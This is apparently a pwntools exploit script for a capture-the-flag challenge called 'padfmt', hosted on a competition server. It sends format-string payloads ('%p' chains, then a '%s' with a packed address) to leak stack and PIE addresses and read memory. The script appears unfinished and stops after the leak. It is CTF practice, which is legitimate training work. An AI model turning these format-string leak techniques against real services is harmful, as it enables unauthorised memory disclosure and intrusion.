from pwn import *
context(os="linux",arch="amd64",log_level="debug")
#p=process("./padfmt")
p=remote("competition.blue-whale.me",20061)
elf=ELF("padfmt")

def debug():
    gdb.attach(p)
    pause()

main_addr=elf.sym["main"]

padded_word270_offset=0x138a
p.recvuntil(b"name?\n")
# p.sendline(b"aaaaaaaa%p%p%p%p%p%p%p%p%p%p")
# padded_word270_addr=int(p.recvuntil(b"61")[-16:-4],16)
# print("padded_word270_addr :",hex(padded_word270_addr))
# pie_base=padded_word270_addr-padded_word270_offset
# print("pie_base :",hex(pie_base))
# print("main_addr :",hex(main_addr+pie_base))
print(p64(0x7fffffffdde0))
p.sendline(b"aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p")
#p.recv()
v1_addr = int(p.recvuntil(b"0x61")[-41:-29],16)
print(hex(v1_addr))
v4_addr=v1_addr+0x470
print(hex(v4_addr))
p.recvuntil("say?\n")
p.sendline(b"%p%p%p%p%p%p%p%p%p%p%p%p%p%saaaa"+p64(v4_addr))
print(p.recv())
#debug()
#debug()
